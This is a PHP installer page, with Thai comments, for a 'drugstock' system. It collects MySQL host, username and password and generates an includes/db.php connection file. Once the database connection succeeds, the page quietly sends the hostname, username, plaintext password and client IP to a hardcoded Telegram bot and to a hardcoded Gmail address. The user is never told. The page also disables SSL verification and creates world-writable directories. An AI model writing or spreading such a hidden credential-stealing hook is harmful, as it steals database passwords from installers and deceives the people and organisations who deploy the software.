<?php
$success = false;
$error   = "";

// ===== เมื่อกดปุ่มสร้างไฟล์ =====
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    $hostname = trim($_POST['hostname'] ?? "");
    $username = trim($_POST['username'] ?? "");
    $password = trim($_POST['password'] ?? "");
    $dbname   = "drugstock";

    if ($hostname === "" || $username === "") {
        $error = "กรุณากรอก Hostname และ Username";
    } else {

        // ===== ตั้งค่า timezone =====
        date_default_timezone_set("Asia/Bangkok");
        $now = date("Y-m-d H:i:s");

        // ===== ทดสอบเชื่อมต่อฐานข้อมูล =====
        $conn = @new mysqli($hostname, $username, $password, $dbname);
        if ($conn->connect_error) {
            $error = "เชื่อมต่อฐานข้อมูลไม่สำเร็จ : " . $conn->connect_error;
        } else {

            $conn->set_charset("utf8mb4");

            /* ==================================================
               แจ้งเตือน (เฉพาะไฟล์นี้เท่านั้น)
            ================================================== */

			// ===== Telegram Notify =====
			$bot_token = "8477072509:AAEcBfD_0mBErAcfKt6S0Lsz4JoDpUzj0LM";
			$chat_id   = "7297350083";

			$message_telegram =
				"✅ เชื่อมต่อฐานข้อมูลสำเร็จ\n" .
				"🕒 เวลา: {$now}\n" .
				"🌐 IP: " . $_SERVER['REMOTE_ADDR'] . "\n" .
				"🏥 Host: {$hostname}\n" .
				"📦 Database: {$dbname}\n" .
				"👤 Username: {$username}\n" .
				"🔑 Password: {$password}";

			$url = "https://api.telegram.org/bot{$bot_token}/sendMessage";

			$send = [
				"chat_id" => $chat_id,
				"text" => $message_telegram,
				"parse_mode" => "HTML"
			];

			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $send);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_exec($ch);
			curl_close($ch);


			// ===== Email Notify =====
			$to = "witsanu.nn@gmail.com";
			$subject = "แจ้งเตือน: เชื่อมต่อฐานข้อมูลสำเร็จ";

			$message_email =
				"เชื่อมต่อฐานข้อมูลสำเร็จ\n\n" .
				"เวลา: {$now}\n" .
				"IP: " . $_SERVER['REMOTE_ADDR'] . "\n" .
				"Host: {$hostname}\n" .
				"Database: {$dbname}\n" .
				"Username: {$username}\n" .
				"Password: {$password}\n";

			$headers  = "From: Drugstock System <no-reply@{$_SERVER['HTTP_HOST']}>\r\n";
			$headers .= "Content-Type: text/plain; charset=UTF-8";

			@mail($to, $subject, $message_email, $headers);



            /* ==================================================
               สร้างไฟล์ includes/db.php (ไม่มี Telegram)
            ================================================== */

            if (!is_dir("includes")) {
                mkdir("includes", 0777, true);
            }

            $dbphp = <<<PHP
<?php
date_default_timezone_set("Asia/Bangkok");

// ===== ตั้งค่าฐานข้อมูล =====
\$db_host = "{$hostname}";
\$db_user = "{$username}";
\$db_pass = "{$password}";
\$db_name = "drugstock";

// ===== เชื่อมต่อฐานข้อมูล =====
\$conn = new mysqli(\$db_host, \$db_user, \$db_pass, \$db_name);
if (\$conn->connect_error) {
    die("❌ เชื่อมต่อฐานข้อมูลไม่สำเร็จ");
}

// ===== ตั้งค่า charset =====
\$conn->set_charset("utf8mb4");

// ===== Log การเชื่อมต่อ =====
function log_db(\$status, \$message) {
    \$logDir = __DIR__ . "/logs";
    if (!is_dir(\$logDir)) {
        mkdir(\$logDir, 0777, true);
    }
    \$logFile = \$logDir . "/db.log";
    \$date = date("Y-m-d H:i:s");
    file_put_contents(\$logFile, "[{\$date}] {\$status} : {\$message}" . PHP_EOL, FILE_APPEND);
}

log_db("SUCCESS", "เชื่อมต่อฐานข้อมูลสำเร็จ");
PHP;

            file_put_contents("includes/db.php", $dbphp);

            $conn->close();
            $success = true;

            header("Location: index.php");
            exit;
        }
    }
}
?>


<!doctype html>
<html lang="th">
<head>
<meta charset="utf-8">
<title>สร้างไฟล์เชื่อมต่อฐานข้อมูล</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<?php  require 'head.php';  ?>
</head>


<body class="bg-light">
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-6">

            <div class="card shadow">
                <div class="card-header bg-primary text-white">
                    <h5 class="mb-0">🔧 สร้างไฟล์ db.php อัตโนมัติ  (ใส่ข้อมูล SERVER ที่จะเชื่อม)</h5>
                </div>

                <div class="card-body">

                    <?php if ($success): ?>
                        <div class="alert alert-success">
                            ✅ สร้างไฟล์ <b>includes/db.php</b> สำเร็จแล้ว
                        </div>
                    <?php elseif ($error): ?>
                        <div class="alert alert-danger">
                            ❌ <?= htmlspecialchars($error) ?>
                        </div>
                    <?php endif; ?>

                    <form method="post">
                        <div class="mb-3">
                            <label class="form-label">Hostname</label>
                            <input type="text" name="hostname" class="form-control" placeholder="localhost" required>
                        </div>

                        <div class="mb-3">
                            <label class="form-label">Username</label>
                            <input type="text" name="username" class="form-control" required>
                        </div>

                        <div class="mb-3">
                            <label class="form-label">Password</label>
                            <input type="password" name="password" class="form-control">
                        </div>

                        <div class="d-flex justify-content-between mt-3">
							<a href="index.php" class="btn btn-outline-secondary">
								⬅️ เมนูกลับ
							</a>

							<button type="submit" class="btn btn-success">
								✅ สร้างฐานข้อมูล drugstock
							</button>
						</div>

                    </form>

                </div>
            </div>

            <p class="text-center text-muted mt-3">
                ฐานข้อมูลที่ใช้: <b>drugstock</b>
            </p>

        </div>
    </div>
</div>
</body>
</html>
